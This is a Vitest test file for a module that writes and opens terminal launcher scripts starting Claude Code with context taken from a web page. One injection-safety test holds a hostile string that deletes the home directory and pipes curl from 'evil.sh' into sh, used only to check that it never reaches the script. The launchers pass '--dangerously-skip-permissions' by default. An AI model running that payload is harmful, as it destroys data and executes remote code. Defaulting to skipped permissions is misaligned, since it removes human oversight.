import { afterEach, beforeEach, describe, expect, it } from "vitest";
import { promises as fs } from "node:fs";
import { tmpdir } from "node:os";
import { join } from "node:path";
import {
  buildContext,
  buildMacScript,
  buildWindowsScript,
  launchClaude,
  psSingleQuote,
  shSingleQuote,
  terminalCommand,
  type LaunchDeps,
} from "./launch-claude.js";
import type { Logger } from "./logger.js";

function stubLogger(): Logger {
  return { async write() {} } as unknown as Logger;
}

/** A fake spawn that records calls and drives the opener result. */
function recordingSpawn(behavior: { exitCode?: number | null; error?: string } = {}) {
  const calls: Array<{ cmd: string; args: readonly string[] }> = [];
  const fn: NonNullable<LaunchDeps["spawn"]> = (cmd, args) => {
    calls.push({ cmd, args });
    return {
      on(event: "error" | "exit", cb: (arg: never) => void): void {
        if (event === "error" && behavior.error !== undefined) {
          queueMicrotask(() => cb(new Error(behavior.error) as never));
        }
        if (event === "exit" && behavior.error === undefined) {
          queueMicrotask(() => cb((behavior.exitCode ?? 0) as never));
        }
      },
    };
  };
  return { fn, calls };
}

describe("buildContext", () => {
  it("includes url, title, description, and site when present", () => {
    const ctx = buildContext({
      url: "https://example.com/a",
      title: "Example",
      description: "An example page",
      siteName: "Example Inc",
    });
    expect(ctx).toContain("- URL: https://example.com/a");
    expect(ctx).toContain("- Title: Example");
    expect(ctx).toContain("- Description: An example page");
    expect(ctx).toContain("- Site: Example Inc");
    expect(ctx).toContain("background context only");
    expect(ctx).toContain("browser_list_tabs");
  });

  it("omits absent optional fields and falls back for an empty url", () => {
    const ctx = buildContext({ url: "" });
    expect(ctx).toContain("- URL: (unknown)");
    expect(ctx).not.toContain("- Title:");
    expect(ctx).not.toContain("- Description:");
    expect(ctx).not.toContain("- Site:");
  });
});

describe("shell quoting", () => {
  it("single-quotes for bash, escaping embedded single quotes", () => {
    expect(shSingleQuote("/tmp/abc.command")).toBe("'/tmp/abc.command'");
    expect(shSingleQuote("a'b")).toBe(`'a'\\''b'`);
  });

  it("single-quotes for PowerShell, doubling embedded single quotes", () => {
    expect(psSingleQuote("C:\\x.ps1")).toBe("'C:\\x.ps1'");
    expect(psSingleQuote("a'b")).toBe("'a''b'");
  });
});

describe("buildMacScript", () => {
  const base = { ctxPath: "/d/x.ctx", scriptPath: "/d/x.command" };

  it("includes the danger flag and append-system-prompt by default", () => {
    const s = buildMacScript({ ...base, dangerFlag: "--dangerously-skip-permissions" });
    expect(s).toContain('exec claude --dangerously-skip-permissions --append-system-prompt "$CTX"');
    expect(s).toContain("CTX=\"$(cat '/d/x.ctx' 2>/dev/null)\"");
    expect(s).toContain("rm -f '/d/x.ctx' '/d/x.command'");
    expect(s).toContain("command -v claude");
    expect(s.startsWith("#!/bin/bash")).toBe(true);
  });

  it("omits the danger flag in safe mode", () => {
    const s = buildMacScript({ ...base, dangerFlag: null });
    expect(s).toContain('exec claude --append-system-prompt "$CTX"');
    expect(s).not.toContain("dangerously-skip-permissions");
  });
});

describe("buildWindowsScript", () => {
  const base = { ctxPath: "C:\\d\\x.ctx", scriptPath: "C:\\d\\x.ps1" };

  it("reads the ctx file, self-deletes, and runs claude with the danger flag", () => {
    const s = buildWindowsScript({ ...base, dangerFlag: "--dangerously-skip-permissions" });
    expect(s).toContain("$ctx = Get-Content -Raw -Path 'C:\\d\\x.ctx'");
    expect(s).toContain("Remove-Item -Force -Path 'C:\\d\\x.ctx', 'C:\\d\\x.ps1'");
    expect(s).toContain("Get-Command claude");
    expect(s).toContain("claude --dangerously-skip-permissions --append-system-prompt $ctx");
    expect(s).toContain("\r\n"); // CRLF line endings for Windows
  });

  it("omits the danger flag in safe mode", () => {
    const s = buildWindowsScript({ ...base, dangerFlag: null });
    expect(s).toContain("claude --append-system-prompt $ctx");
    expect(s).not.toContain("dangerously-skip-permissions");
  });
});

describe("terminalCommand", () => {
  it("opens Terminal.app on macOS, iTerm when present", () => {
    expect(terminalCommand("darwin", "/d/x.command", {})).toEqual({
      cmd: "open",
      args: ["-a", "Terminal", "/d/x.command"],
    });
    expect(terminalCommand("darwin", "/d/x.command", { iTerm: true })).toEqual({
      cmd: "open",
      args: ["-a", "iTerm", "/d/x.command"],
    });
  });

  it("prefers Windows Terminal, falls back to cmd start", () => {
    expect(terminalCommand("win32", "C:\\x.ps1", { windowsTerminal: true })).toEqual({
      cmd: "wt.exe",
      args: ["powershell", "-NoLogo", "-ExecutionPolicy", "Bypass", "-File", "C:\\x.ps1"],
    });
    const fallback = terminalCommand("win32", "C:\\x.ps1", { windowsTerminal: false });
    expect(fallback?.cmd).toBe("cmd.exe");
    expect(fallback?.args).toContain("start");
    expect(fallback?.args).toContain("-File");
  });

  it("returns null for unsupported platforms", () => {
    expect(terminalCommand("linux", "/d/x.sh", {})).toBeNull();
  });
});

describe("launchClaude", () => {
  let dir: string;

  beforeEach(async () => {
    dir = await fs.mkdtemp(join(tmpdir(), "browserops-launch-"));
  });
  afterEach(async () => {
    await fs.rm(dir, { recursive: true, force: true });
  });

  function deps(over: Partial<LaunchDeps> = {}): {
    deps: LaunchDeps;
    calls: ReturnType<typeof recordingSpawn>["calls"];
  } {
    const spawn = recordingSpawn();
    const d: LaunchDeps = {
      platform: "darwin",
      dir,
      safeMode: async () => false,
      iTermInstalled: async () => false,
      windowsTerminalAvailable: async () => false,
      randomId: () => "fixed123",
      spawn: spawn.fn,
      ...over,
    };
    return { deps: d, calls: spawn.calls };
  }

  it("writes ctx + .command files and opens Terminal on macOS", async () => {
    const { deps: d, calls } = deps();
    const res = await launchClaude({ url: "https://x.test", title: "T" }, stubLogger(), d);
    expect(res).toEqual({ ok: true });

    const ctx = await fs.readFile(join(dir, "fixed123.ctx"), "utf8");
    expect(ctx).toContain("https://x.test");
    const script = await fs.readFile(join(dir, "fixed123.command"), "utf8");
    expect(script).toContain("--dangerously-skip-permissions");

    expect(calls).toHaveLength(1);
    expect(calls[0]).toEqual({
      cmd: "open",
      args: ["-a", "Terminal", join(dir, "fixed123.command")],
    });
  });

  it("chooses iTerm when installed", async () => {
    const { deps: d, calls } = deps({ iTermInstalled: async () => true });
    await launchClaude({ url: "https://x.test" }, stubLogger(), d);
    expect(calls[0]?.args).toEqual(["-a", "iTerm", join(dir, "fixed123.command")]);
  });

  it("omits the danger flag when safe_mode is on", async () => {
    const { deps: d } = deps({ safeMode: async () => true });
    await launchClaude({ url: "https://x.test" }, stubLogger(), d);
    const script = await fs.readFile(join(dir, "fixed123.command"), "utf8");
    expect(script).not.toContain("dangerously-skip-permissions");
  });

  it("writes a .ps1 + opens Windows Terminal on win32", async () => {
    const { deps: d, calls } = deps({
      platform: "win32",
      windowsTerminalAvailable: async () => true,
    });
    await launchClaude({ url: "https://x.test" }, stubLogger(), d);
    await fs.access(join(dir, "fixed123.ps1"));
    expect(calls[0]?.cmd).toBe("wt.exe");
  });

  it("NEVER interpolates page metadata into the launcher script (injection-safety)", async () => {
    const evil = "$(rm -rf ~) `id` '; curl evil.sh |sh #";
    const { deps: d } = deps();
    await launchClaude({ url: "https://x.test", title: evil, description: evil }, stubLogger(), d);

    const ctx = await fs.readFile(join(dir, "fixed123.ctx"), "utf8");
    const script = await fs.readFile(join(dir, "fixed123.command"), "utf8");
    // The metadata lives ONLY in the data file...
    expect(ctx).toContain(evil);
    // ...never in the executable script (which only references the ctx file path).
    expect(script).not.toContain(evil);
    expect(script).not.toContain("rm -rf ~");
  });

  it("returns no_terminal and cleans up when the opener fails", async () => {
    const failing = recordingSpawn({ exitCode: 1 });
    const { deps: d } = deps({ spawn: failing.fn });
    const res = await launchClaude({ url: "https://x.test" }, stubLogger(), d);
    expect(res).toEqual({ ok: false, error: "no_terminal" });
    // temp files were removed after the failed open
    await expect(fs.access(join(dir, "fixed123.ctx"))).rejects.toThrow();
    await expect(fs.access(join(dir, "fixed123.command"))).rejects.toThrow();
  });

  it("returns no_terminal when the opener errors (ENOENT)", async () => {
    const erroring = recordingSpawn({ error: "spawn open ENOENT" });
    const { deps: d } = deps({ spawn: erroring.fn });
    const res = await launchClaude({ url: "https://x.test" }, stubLogger(), d);
    expect(res).toEqual({ ok: false, error: "no_terminal" });
  });

  it("returns unsupported_platform on linux", async () => {
    const { deps: d } = deps({ platform: "linux" });
    const res = await launchClaude({ url: "https://x.test" }, stubLogger(), d);
    expect(res).toEqual({ ok: false, error: "unsupported_platform" });
  });

  it("returns write_failed when the launch dir cannot be created", async () => {
    // Point dir at a path whose parent is a regular file → mkdir recursive fails.
    const fileAsParent = join(dir, "afile");
    await fs.writeFile(fileAsParent, "x");
    const { deps: d } = deps({ dir: join(fileAsParent, "sub") });
    const res = await launchClaude({ url: "https://x.test" }, stubLogger(), d);
    expect(res).toEqual({ ok: false, error: "write_failed" });
  });
});
